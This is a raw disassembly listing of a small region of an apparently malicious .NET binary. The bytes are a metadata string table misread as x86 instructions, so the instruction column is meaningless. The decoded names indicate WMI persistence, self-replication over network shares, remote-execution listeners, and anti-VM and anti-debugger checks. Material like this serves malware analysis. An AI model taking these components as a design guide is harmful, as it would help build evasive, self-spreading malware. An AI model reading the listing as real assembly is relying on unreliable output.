  4085fe:	6c                   	insb   (%dx),%es:(%edi)
  4085ff:	6c                   	insb   (%dx),%es:(%edi)
  408600:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408605:	6e                   	outsb  %ds:(%esi),(%dx)
  408606:	00 48 74             	add    %cl,0x74(%eax)
  408609:	74 70                	je     0x40867b
  40860b:	4c                   	dec    %esp
  40860c:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408613:	50                   	push   %eax
  408614:	72 65                	jb     0x40867b
  408616:	66 69 78 43 6f 6c    	imul   $0x6c6f,0x43(%eax),%di
  40861c:	6c                   	insb   (%dx),%es:(%edi)
  40861d:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408622:	6e                   	outsb  %ds:(%esi),(%dx)
  408623:	00 53 65             	add    %dl,0x65(%ebx)
  408626:	61                   	popa
  408627:	72 63                	jb     0x40868c
  408629:	68 4f 70 74 69       	push   $0x6974704f
  40862e:	6f                   	outsl  %ds:(%esi),(%dx)
  40862f:	6e                   	outsb  %ds:(%esi),(%dx)
  408630:	00 49 4f             	add    %cl,0x4f(%ecx)
  408633:	45                   	inc    %ebp
  408634:	78 63                	js     0x408699
  408636:	65 70 74             	gs jo  0x4086ad
  408639:	69 6f 6e 00 54 61 73 	imul   $0x73615400,0x6e(%edi),%ebp
  408640:	6b 43 61 6e          	imul   $0x6e,0x61(%ebx),%eax
  408644:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408647:	65 64 45             	gs fs inc %ebp
  40864a:	78 63                	js     0x4086af
  40864c:	65 70 74             	gs jo  0x4086c3
  40864f:	69 6f 6e 00 55 6e 61 	imul   $0x616e5500,0x6e(%edi),%ebp
  408656:	75 74                	jne    0x4086cc
  408658:	68 6f 72 69 7a       	push   $0x7a69726f
  40865d:	65 64 41             	gs fs inc %ecx
  408660:	63 63 65             	arpl   %esp,0x65(%ebx)
  408663:	73 73                	jae    0x4086d8
  408665:	45                   	inc    %ebp
  408666:	78 63                	js     0x4086cb
  408668:	65 70 74             	gs jo  0x4086df
  40866b:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  408672:	45                   	inc    %ebp
  408673:	78 63                	js     0x4086d8
  408675:	65 70 74             	gs jo  0x4086ec
  408678:	69 6f 6e 00 43 72 65 	imul   $0x65724300,0x6e(%edi),%ebp
  40867f:	61                   	popa
  408680:	74 65                	je     0x4086e7
  408682:	57                   	push   %edi
  408683:	4d                   	dec    %ebp
  408684:	49                   	dec    %ecx
  408685:	45                   	inc    %ebp
  408686:	76 65                	jbe    0x4086ed
  408688:	6e                   	outsb  %ds:(%esi),(%dx)
  408689:	74 53                	je     0x4086de
  40868b:	75 62                	jne    0x4086ef
  40868d:	73 63                	jae    0x4086f2
  40868f:	72 69                	jb     0x4086fa
  408691:	70 74                	jo     0x408707
  408693:	69 6f 6e 00 53 74 72 	imul   $0x72745300,0x6e(%edi),%ebp
  40869a:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  4086a1:	61                   	popa
  4086a2:	72 69                	jb     0x40870d
  4086a4:	73 6f                	jae    0x408715
  4086a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4086a7:	00 52 61             	add    %dl,0x61(%edx)
  4086aa:	6d                   	insl   (%dx),%es:(%edi)
  4086ab:	52                   	push   %edx
  4086ac:	75 6e                	jne    0x40871c
  4086ae:	00 46 69             	add    %al,0x69(%esi)
  4086b1:	6c                   	insb   (%dx),%es:(%edi)
  4086b2:	65 49                	gs dec %ecx
  4086b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4086b5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086b7:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  4086bb:	76 65                	jbe    0x408722
  4086bd:	49                   	dec    %ecx
  4086be:	6e                   	outsb  %ds:(%esi),(%dx)
  4086bf:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086c1:	00 45 78             	add    %al,0x78(%ebp)
  4086c4:	63 65 70             	arpl   %esp,0x70(%ebp)
  4086c7:	74 69                	je     0x408732
  4086c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4086ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4086cb:	44                   	inc    %esp
  4086cc:	69 73 70 61 74 63 68 	imul   $0x68637461,0x70(%ebx),%esi
  4086d3:	49                   	dec    %ecx
  4086d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4086d5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086d7:	00 46 69             	add    %al,0x69(%esi)
  4086da:	6c                   	insb   (%dx),%es:(%edi)
  4086db:	65 53                	gs push %ebx
  4086dd:	79 73                	jns    0x408752
  4086df:	74 65                	je     0x408746
  4086e1:	6d                   	insl   (%dx),%es:(%edi)
  4086e2:	49                   	dec    %ecx
  4086e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4086e4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086e6:	00 67 65             	add    %ah,0x65(%edi)
  4086e9:	74 5f                	je     0x40874a
  4086eb:	53                   	push   %ebx
  4086ec:	74 61                	je     0x40874f
  4086ee:	72 74                	jb     0x408764
  4086f0:	49                   	dec    %ecx
  4086f1:	6e                   	outsb  %ds:(%esi),(%dx)
  4086f2:	66 6f                	outsw  %ds:(%esi),(%dx)
  4086f4:	00 50 72             	add    %dl,0x72(%eax)
  4086f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4086f8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4086fb:	73 53                	jae    0x408750
  4086fd:	74 61                	je     0x408760
  4086ff:	72 74                	jb     0x408775
  408701:	49                   	dec    %ecx
  408702:	6e                   	outsb  %ds:(%esi),(%dx)
  408703:	66 6f                	outsw  %ds:(%esi),(%dx)
  408705:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  408709:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40870e:	79 49                	jns    0x408759
  408710:	6e                   	outsb  %ds:(%esi),(%dx)
  408711:	66 6f                	outsw  %ds:(%esi),(%dx)
  408713:	00 5a 65             	add    %bl,0x65(%edx)
  408716:	72 6f                	jb     0x408787
  408718:	00 53 6c             	add    %dl,0x6c(%ebx)
  40871b:	65 65 70 00          	gs gs jo 0x40871f
  40871f:	69 70 00 53 70 69 6b 	imul   $0x6b697053,0x0(%eax),%esi
  408726:	65 4c                	gs dec %esp
  408728:	6f                   	outsl  %ds:(%esi),(%dx)
  408729:	6f                   	outsl  %ds:(%esi),(%dx)
  40872a:	70 00                	jo     0x40872c
  40872c:	53                   	push   %ebx
  40872d:	74 6f                	je     0x40879e
  40872f:	70 00                	jo     0x408731
  408731:	53                   	push   %ebx
  408732:	79 73                	jns    0x4087a7
  408734:	74 65                	je     0x40879b
  408736:	6d                   	insl   (%dx),%es:(%edi)
  408737:	2e 4c                	cs dec %esp
  408739:	69 6e 71 00 43 68 61 	imul   $0x61684300,0x71(%esi),%ebp
  408740:	72 00                	jb     0x408742
  408742:	6d                   	insl   (%dx),%es:(%edi)
  408743:	61                   	popa
  408744:	63 41 64             	arpl   %eax,0x64(%ecx)
  408747:	64 72 00             	fs jb  0x40874a
  40874a:	53                   	push   %ebx
  40874b:	74 72                	je     0x4087bf
  40874d:	65 61                	gs popa
  40874f:	6d                   	insl   (%dx),%es:(%edi)
  408750:	52                   	push   %edx
  408751:	65 61                	gs popa
  408753:	64 65 72 00          	fs gs jb 0x408757
  408757:	54                   	push   %esp
  408758:	65 78 74             	gs js  0x4087cf
  40875b:	52                   	push   %edx
  40875c:	65 61                	gs popa
  40875e:	64 65 72 00          	fs gs jb 0x408762
  408762:	41                   	inc    %ecx
  408763:	73 79                	jae    0x4087de
  408765:	6e                   	outsb  %ds:(%esi),(%dx)
  408766:	63 54 61 73          	arpl   %edx,0x73(%ecx,%eiz,2)
  40876a:	6b 4d 65 74          	imul   $0x74,0x65(%ebp),%ecx
  40876e:	68 6f 64 42 75       	push   $0x7542646f
  408773:	69 6c 64 65 72 00 3c 	imul   $0x3e3c0072,0x65(%esp,%eiz,2),%ebp
  40877a:	3e 
  40877b:	74 5f                	je     0x4087dc
  40877d:	5f                   	pop    %edi
  40877e:	62 75 69             	bound  %esi,0x69(%ebp)
  408781:	6c                   	insb   (%dx),%es:(%edi)
  408782:	64 65 72 00          	fs gs jb 0x408786
  408786:	53                   	push   %ebx
  408787:	70 65                	jo     0x4087ee
  408789:	63 69 61             	arpl   %ebp,0x61(%ecx)
  40878c:	6c                   	insb   (%dx),%es:(%edi)
  40878d:	46                   	inc    %esi
  40878e:	6f                   	outsl  %ds:(%esi),(%dx)
  40878f:	6c                   	insb   (%dx),%es:(%edi)
  408790:	64 65 72 00          	fs gs jb 0x408794
  408794:	62 75 66             	bound  %esi,0x66(%ebp)
  408797:	66 65 72 00          	data16 gs jb 0x40879b
  40879b:	44                   	inc    %esp
  40879c:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4087a0:	67 65 72 00          	addr16 gs jb 0x4087a4
  4087a4:	4d                   	dec    %ebp
  4087a5:	61                   	popa
  4087a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4087a7:	61                   	popa
  4087a8:	67 65 6d             	gs insl (%dx),%es:(%di)
  4087ab:	65 6e                	outsb  %gs:(%esi),(%dx)
  4087ad:	74 4f                	je     0x4087fe
  4087af:	62 6a 65             	bound  %ebp,0x65(%edx)
  4087b2:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  4087b6:	61                   	popa
  4087b7:	72 63                	jb     0x40881c
  4087b9:	68 65 72 00 74       	push   $0x74007265
  4087be:	68 72 6f 74 74       	push   $0x74746f72
  4087c3:	6c                   	insb   (%dx),%es:(%edi)
  4087c4:	65 72 00             	gs jb  0x4087c7
  4087c7:	53                   	push   %ebx
  4087c8:	74 61                	je     0x40882b
  4087ca:	72 74                	jb     0x408840
  4087cc:	52                   	push   %edx
  4087cd:	65 6d                	gs insl (%dx),%es:(%edi)
  4087cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4087d0:	74 65                	je     0x408837
  4087d2:	45                   	inc    %ebp
  4087d3:	78 65                	js     0x40883a
  4087d5:	63 75 74             	arpl   %esi,0x74(%ebp)
  4087d8:	69 6f 6e 4c 69 73 74 	imul   $0x7473694c,0x6e(%edi),%ebp
  4087df:	65 6e                	outsb  %gs:(%esi),(%dx)
  4087e1:	65 72 00             	gs jb  0x4087e4
  4087e4:	54                   	push   %esp
  4087e5:	63 70 4c             	arpl   %esi,0x4c(%eax)
  4087e8:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  4087ef:	00 53 74             	add    %dl,0x74(%ebx)
  4087f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f3:	70 4c                	jo     0x408841
  4087f5:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  4087fc:	00 48 74             	add    %cl,0x74(%eax)
  4087ff:	74 70                	je     0x408871
  408801:	4c                   	dec    %esp
  408802:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  408809:	00 6c 69 73          	add    %ch,0x73(%ecx,%ebp,2)
  40880d:	74 65                	je     0x408874
  40880f:	6e                   	outsb  %ds:(%esi),(%dx)
  408810:	65 72 00             	gs jb  0x408813
  408813:	6d                   	insl   (%dx),%es:(%edi)
  408814:	61                   	popa
  408815:	6e                   	outsb  %ds:(%esi),(%dx)
  408816:	75 66                	jne    0x40887e
  408818:	61                   	popa
  408819:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  40881d:	65 72 00             	gs jb  0x408820
  408820:	61                   	popa
  408821:	64 6d                	fs insl (%dx),%es:(%edi)
  408823:	69 6e 55 73 65 72 00 	imul   $0x726573,0x55(%esi),%ebp
  40882a:	43                   	inc    %ebx
  40882b:	75 72                	jne    0x40889f
  40882d:	72 65                	jb     0x408894
  40882f:	6e                   	outsb  %ds:(%esi),(%dx)
  408830:	74 55                	je     0x408887
  408832:	73 65                	jae    0x408899
  408834:	72 00                	jb     0x408836
  408836:	6c                   	insb   (%dx),%es:(%edi)
  408837:	70 50                	jo     0x408889
  408839:	61                   	popa
  40883a:	72 61                	jb     0x40889d
  40883c:	6d                   	insl   (%dx),%es:(%edi)
  40883d:	65 74 65             	gs je  0x4088a5
  408840:	72 00                	jb     0x408842
  408842:	54                   	push   %esp
  408843:	61                   	popa
  408844:	73 6b                	jae    0x4088b1
  408846:	41                   	inc    %ecx
  408847:	77 61                	ja     0x4088aa
  408849:	69 74 65 72 00 47 65 	imul   $0x74654700,0x72(%ebp,%eiz,2),%esi
  408850:	74 
  408851:	41                   	inc    %ecx
  408852:	77 61                	ja     0x4088b5
  408854:	69 74 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esi
  40885b:	72 
  40885c:	65 61                	gs popa
  40885e:	6d                   	insl   (%dx),%es:(%edi)
  40885f:	57                   	push   %edi
  408860:	72 69                	jb     0x4088cb
  408862:	74 65                	je     0x4088c9
  408864:	72 00                	jb     0x408866
  408866:	54                   	push   %esp
  408867:	65 78 74             	gs js  0x4088de
  40886a:	57                   	push   %edi
  40886b:	72 69                	jb     0x4088d6
  40886d:	74 65                	je     0x4088d4
  40886f:	72 00                	jb     0x408871
  408871:	45                   	inc    %ebp
  408872:	6e                   	outsb  %ds:(%esi),(%dx)
  408873:	74 65                	je     0x4088da
  408875:	72 00                	jb     0x408877
  408877:	54                   	push   %esp
  408878:	6f                   	outsl  %ds:(%esi),(%dx)
  408879:	4c                   	dec    %esp
  40887a:	6f                   	outsl  %ds:(%esi),(%dx)
  40887b:	77 65                	ja     0x4088e2
  40887d:	72 00                	jb     0x40887f
  40887f:	77 6f                	ja     0x4088f0
  408881:	72 6b                	jb     0x4088ee
  408883:	69 6e 67 44 69 72 00 	imul   $0x726944,0x67(%esi),%ebp
  40888a:	73 65                	jae    0x4088f1
  40888c:	74 5f                	je     0x4088ed
  40888e:	46                   	inc    %esi
  40888f:	6f                   	outsl  %ds:(%esi),(%dx)
  408890:	72 65                	jb     0x4088f7
  408892:	67 72 6f             	addr16 jb 0x408904
  408895:	75 6e                	jne    0x408905
  408897:	64 43                	fs inc %ebx
  408899:	6f                   	outsl  %ds:(%esi),(%dx)
  40889a:	6c                   	insb   (%dx),%es:(%edi)
  40889b:	6f                   	outsl  %ds:(%esi),(%dx)
  40889c:	72 00                	jb     0x40889e
  40889e:	43                   	inc    %ebx
  40889f:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a1:	73 6f                	jae    0x408912
  4088a3:	6c                   	insb   (%dx),%es:(%edi)
  4088a4:	65 43                	gs inc %ebx
  4088a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a7:	6c                   	insb   (%dx),%es:(%edi)
  4088a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a9:	72 00                	jb     0x4088ab
  4088ab:	52                   	push   %edx
  4088ac:	65 73 65             	gs jae 0x408914
  4088af:	74 43                	je     0x4088f4
  4088b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b2:	6c                   	insb   (%dx),%es:(%edi)
  4088b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088b4:	72 00                	jb     0x4088b6
  4088b6:	67 65 74 5f          	addr16 gs je 0x408919
  4088ba:	53                   	push   %ebx
  4088bb:	74 61                	je     0x40891e
  4088bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4088be:	64 61                	fs popa
  4088c0:	72 64                	jb     0x408926
  4088c2:	45                   	inc    %ebp
  4088c3:	72 72                	jb     0x408937
  4088c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c6:	72 00                	jb     0x4088c8
  4088c8:	73 65                	jae    0x40892f
  4088ca:	74 5f                	je     0x40892b
  4088cc:	52                   	push   %edx
  4088cd:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  4088d4:	53 74 
  4088d6:	61                   	popa
  4088d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088d8:	64 61                	fs popa
  4088da:	72 64                	jb     0x408940
  4088dc:	45                   	inc    %ebp
  4088dd:	72 72                	jb     0x408951
  4088df:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e0:	72 00                	jb     0x4088e2
  4088e2:	53                   	push   %ebx
  4088e3:	65 6c                	gs insb (%dx),%es:(%edi)
  4088e5:	66 52                	push   %dx
  4088e7:	65 70 6c             	gs jo  0x408956
  4088ea:	69 63 61 74 6f 72 00 	imul   $0x726f74,0x61(%ebx),%esp
  4088f1:	4d                   	dec    %ebp
  4088f2:	61                   	popa
  4088f3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088f4:	61                   	popa
  4088f5:	67 65 6d             	gs insl (%dx),%es:(%di)
  4088f8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4088fa:	74 4f                	je     0x40894b
  4088fc:	62 6a 65             	bound  %ebp,0x65(%edx)
  4088ff:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  408903:	75 6d                	jne    0x408972
  408905:	65 72 61             	gs jb  0x408969
  408908:	74 6f                	je     0x408979
  40890a:	72 00                	jb     0x40890c
  40890c:	47                   	inc    %edi
  40890d:	65 74 45             	gs je  0x408955
  408910:	6e                   	outsb  %ds:(%esi),(%dx)
  408911:	75 6d                	jne    0x408980
  408913:	65 72 61             	gs jb  0x408977
  408916:	74 6f                	je     0x408987
  408918:	72 00                	jb     0x40891a
  40891a:	49                   	dec    %ecx
  40891b:	73 41                	jae    0x40895e
  40891d:	64 6d                	fs insl (%dx),%es:(%edi)
  40891f:	69 6e 69 73 74 72 61 	imul   $0x61727473,0x69(%esi),%ebp
  408926:	74 6f                	je     0x408997
  408928:	72 00                	jb     0x40892a
  40892a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40892f:	00 2e                	add    %ch,(%esi)
  408931:	63 63 74             	arpl   %esp,0x74(%ebx)
  408934:	6f                   	outsl  %ds:(%esi),(%dx)
  408935:	72 00                	jb     0x408937
  408937:	4d                   	dec    %ebp
  408938:	6f                   	outsl  %ds:(%esi),(%dx)
  408939:	6e                   	outsb  %ds:(%esi),(%dx)
  40893a:	69 74 6f 72 00 55 49 	imul   $0x6e495500,0x72(%edi,%ebp,2),%esi
  408941:	6e 
  408942:	74 50                	je     0x408994
  408944:	74 72                	je     0x4089b8
  408946:	00 53 79             	add    %dl,0x79(%ebx)
  408949:	73 74                	jae    0x4089bf
  40894b:	65 6d                	gs insl (%dx),%es:(%edi)
  40894d:	2e 44                	cs inc %esp
  40894f:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  408956:	69 63 73 00 46 72 6f 	imul   $0x6f724600,0x73(%ebx),%esp
  40895d:	6d                   	insl   (%dx),%es:(%edi)
  40895e:	53                   	push   %ebx
  40895f:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408963:	64 73 00             	fs jae 0x408966
  408966:	41                   	inc    %ecx
  408967:	64 64 4d             	fs fs dec %ebp
  40896a:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  408971:	6f 
  408972:	6e                   	outsb  %ds:(%esi),(%dx)
  408973:	64 73 00             	fs jae 0x408976
  408976:	67 65 74 5f          	addr16 gs je 0x4089d9
  40897a:	45                   	inc    %ebp
  40897b:	6c                   	insb   (%dx),%es:(%edi)
  40897c:	61                   	popa
  40897d:	70 73                	jo     0x4089f2
  40897f:	65 64 4d             	gs fs dec %ebp
  408982:	69 6c 6c 69 73 65 63 	imul   $0x6f636573,0x69(%esp,%ebp,2),%ebp
  408989:	6f 
  40898a:	6e                   	outsb  %ds:(%esi),(%dx)
  40898b:	64 73 00             	fs jae 0x40898e
  40898e:	47                   	inc    %edi
  40898f:	65 74 41             	gs je  0x4089d3
  408992:	6c                   	insb   (%dx),%es:(%edi)
  408993:	6c                   	insb   (%dx),%es:(%edi)
  408994:	4e                   	dec    %esi
  408995:	65 74 77             	gs je  0x408a0f
  408998:	6f                   	outsl  %ds:(%esi),(%dx)
  408999:	72 6b                	jb     0x408a06
  40899b:	49                   	dec    %ecx
  40899c:	6e                   	outsb  %ds:(%esi),(%dx)
  40899d:	74 65                	je     0x408a04
  40899f:	72 66                	jb     0x408a07
  4089a1:	61                   	popa
  4089a2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089a5:	00 48 61             	add    %cl,0x61(%eax)
  4089a8:	73 56                	jae    0x408a00
  4089aa:	69 72 74 75 61 6c 4d 	imul   $0x4d6c6175,0x74(%edx),%esi
  4089b1:	61                   	popa
  4089b2:	63 68 69             	arpl   %ebp,0x69(%eax)
  4089b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b6:	65 44                	gs inc %esp
  4089b8:	65 76 69             	gs jbe 0x408a24
  4089bb:	63 65 73             	arpl   %esp,0x73(%ebp)
  4089be:	00 53 79             	add    %dl,0x79(%ebx)
  4089c1:	73 74                	jae    0x408a37
  4089c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4089c5:	2e 52                	cs push %edx
  4089c7:	75 6e                	jne    0x408a37
  4089c9:	74 69                	je     0x408a34
  4089cb:	6d                   	insl   (%dx),%es:(%edi)
  4089cc:	65 2e 45             	gs cs inc %ebp
  4089cf:	78 63                	js     0x408a34
  4089d1:	65 70 74             	gs jo  0x408a48
  4089d4:	69 6f 6e 53 65 72 76 	imul   $0x76726553,0x6e(%edi),%ebp
  4089db:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4089e2:	73 74                	jae    0x408a58
  4089e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4089e6:	2e 52                	cs push %edx
  4089e8:	75 6e                	jne    0x408a58
  4089ea:	74 69                	je     0x408a55
  4089ec:	6d                   	insl   (%dx),%es:(%edi)
  4089ed:	65 2e 49             	gs cs dec %ecx
  4089f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f1:	74 65                	je     0x408a58
  4089f3:	72 6f                	jb     0x408a64
  4089f5:	70 53                	jo     0x408a4a
  4089f7:	65 72 76             	gs jb  0x408a70
  4089fa:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  408a01:	73 74                	jae    0x408a77
  408a03:	65 6d                	gs insl (%dx),%es:(%edi)
  408a05:	2e 52                	cs push %edx
  408a07:	75 6e                	jne    0x408a77
  408a09:	74 69                	je     0x408a74
  408a0b:	6d                   	insl   (%dx),%es:(%edi)
  408a0c:	65 2e 43             	gs cs inc %ebx
  408a0f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a10:	6d                   	insl   (%dx),%es:(%edi)
  408a11:	70 69                	jo     0x408a7c
  408a13:	6c                   	insb   (%dx),%es:(%edi)
  408a14:	65 72 53             	gs jb  0x408a6a
  408a17:	65 72 76             	gs jb  0x408a90
  408a1a:	69 63 65 73 00 48 61 	imul   $0x61480073,0x65(%ebx),%esp
  408a21:	73 4c                	jae    0x408a6f
  408a23:	6f                   	outsl  %ds:(%esi),(%dx)
  408a24:	77 48                	ja     0x408a6e
  408a26:	61                   	popa
  408a27:	72 64                	jb     0x408a8d
  408a29:	77 61                	ja     0x408a8c
  408a2b:	72 65                	jb     0x408a92
  408a2d:	52                   	push   %edx
  408a2e:	65 73 6f             	gs jae 0x408aa0
  408a31:	75 72                	jne    0x408aa5
  408a33:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a36:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  408a3a:	75 67                	jne    0x408aa3
  408a3c:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  408a43:	65 
  408a44:	73 00                	jae    0x408a46
  408a46:	73 65                	jae    0x408aad
  408a48:	74 5f                	je     0x408aa9
  408a4a:	45                   	inc    %ebp
  408a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4c:	61                   	popa
  408a4d:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408a51:	72 69                	jb     0x408abc
  408a53:	76 69                	jbe    0x408abe
  408a55:	6c                   	insb   (%dx),%es:(%edi)
  408a56:	65 67 65 73 00       	gs addr16 gs jae 0x408a5b
  408a5b:	43                   	inc    %ebx
  408a5c:	6c                   	insb   (%dx),%es:(%edi)
  408a5d:	65 61                	gs popa
  408a5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a60:	4f                   	dec    %edi
  408a61:	6c                   	insb   (%dx),%es:(%edi)
  408a62:	64 43                	fs inc %ebx
  408a64:	6f                   	outsl  %ds:(%esi),(%dx)
  408a65:	70 69                	jo     0x408ad0
  408a67:	65 73 00             	gs jae 0x408a6a
  408a6a:	47                   	inc    %edi
  408a6b:	65 74 46             	gs je  0x408ab4
  408a6e:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  408a75:	74 
  408a76:	56                   	push   %esi
  408a77:	61                   	popa
  408a78:	6c                   	insb   (%dx),%es:(%edi)
  408a79:	75 65                	jne    0x408ae0
  408a7b:	4e                   	dec    %esi
  408a7c:	61                   	popa
  408a7d:	6d                   	insl   (%dx),%es:(%edi)
  408a7e:	65 73 00             	gs jae 0x408a81
  408a81:	44                   	inc    %esp
  408a82:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408a86:	67 65 72 50          	addr16 gs jb 0x408ada
  408a8a:	72 6f                	jb     0x408afb
  408a8c:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a8f:	73 4e                	jae    0x408adf
  408a91:	61                   	popa
  408a92:	6d                   	insl   (%dx),%es:(%edi)
  408a93:	65 73 00             	gs jae 0x408a96
  408a96:	43                   	inc    %ebx
  408a97:	6f                   	outsl  %ds:(%esi),(%dx)
  408a98:	6d                   	insl   (%dx),%es:(%edi)
  408a99:	6d                   	insl   (%dx),%es:(%edi)
  408a9a:	6f                   	outsl  %ds:(%esi),(%dx)
  408a9b:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9c:	53                   	push   %ebx
  408a9d:	68 61 72 65 73       	push   $0x73657261
  408aa2:	00 47 65             	add    %al,0x65(%edi)
  408aa5:	74 50                	je     0x408af7
  408aa7:	72 6f                	jb     0x408b18
  408aa9:	63 65 73             	arpl   %esp,0x73(%ebp)
  408aac:	73 65                	jae    0x408b13
  408aae:	73 00                	jae    0x408ab0
  408ab0:	6c                   	insb   (%dx),%es:(%edi)
  408ab1:	70 54                	jo     0x408b07
  408ab3:	68 72 65 61 64       	push   $0x64616572
  408ab8:	41                   	inc    %ecx
  408ab9:	74 74                	je     0x408b2f
  408abb:	72 69                	jb     0x408b26
  408abd:	62 75 74             	bound  %esi,0x74(%ebp)
  408ac0:	65 73 00             	gs jae 0x408ac3
  408ac3:	46                   	inc    %esi
  408ac4:	69 6c 65 41 74 74 72 	imul   $0x69727474,0x41(%ebp,%eiz,2),%ebp
  408acb:	69 
  408acc:	62 75 74             	bound  %esi,0x74(%ebp)
  408acf:	65 73 00             	gs jae 0x408ad2
  408ad2:	53                   	push   %ebx
  408ad3:	65 74 41             	gs je  0x408b17
  408ad6:	74 74                	je     0x408b4c
  408ad8:	72 69                	jb     0x408b43
  408ada:	62 75 74             	bound  %esi,0x74(%ebp)
  408add:	65 73 00             	gs jae 0x408ae0
  408ae0:	52                   	push   %edx
  408ae1:	65 61                	gs popa
  408ae3:	64 41                	fs inc %ecx
  408ae5:	6c                   	insb   (%dx),%es:(%edi)
  408ae6:	6c                   	insb   (%dx),%es:(%edi)
  408ae7:	42                   	inc    %edx
  408ae8:	79 74                	jns    0x408b5e
  408aea:	65 73 00             	gs jae 0x408aed
  408aed:	47                   	inc    %edi
  408aee:	65 74 42             	gs je  0x408b33
  408af1:	79 74                	jns    0x408b67
  408af3:	65 73 00             	gs jae 0x408af6
  408af6:	47                   	inc    %edi
  408af7:	65 74 4c             	gs je  0x408b46
  408afa:	6f                   	outsl  %ds:(%esi),(%dx)
  408afb:	67 69 63 61 6c 44 72 	imul   $0x6972446c,0x61(%bp,%di),%esp
  408b02:	69 
  408b03:	76 65                	jbe    0x408b6a
  408b05:	73 00                	jae    0x408b07
  408b07:	47                   	inc    %edi
  408b08:	65 74 44             	gs je  0x408b4f
  408b0b:	72 69                	jb     0x408b76
  408b0d:	76 65                	jbe    0x408b74
  408b0f:	73 00                	jae    0x408b11
  408b11:	67 65 74 5f          	addr16 gs je 0x408b74
  408b15:	50                   	push   %eax
  408b16:	72 65                	jb     0x408b7d
  408b18:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  408b1e:	53                   	push   %ebx
  408b1f:	75 73                	jne    0x408b94
  408b21:	70 69                	jo     0x408b8c
  408b23:	63 69 6f             	arpl   %ebp,0x6f(%ecx)
  408b26:	75 73                	jne    0x408b9b
  408b28:	4d                   	dec    %ebp
  408b29:	61                   	popa
  408b2a:	63 73 50             	arpl   %esi,0x50(%ebx)
  408b2d:	72 65                	jb     0x408b94
  408b2f:	66 69 78 65 73 00    	imul   $0x73,0x65(%eax),%di
  408b35:	64 77 43             	fs ja  0x408b7b
  408b38:	72 65                	jb     0x408b9f
  408b3a:	61                   	popa
  408b3b:	74 69                	je     0x408ba6
  408b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b3f:	46                   	inc    %esi
  408b40:	6c                   	insb   (%dx),%es:(%edi)
  408b41:	61                   	popa
  408b42:	67 73 00             	addr16 jae 0x408b45
  408b45:	61                   	popa
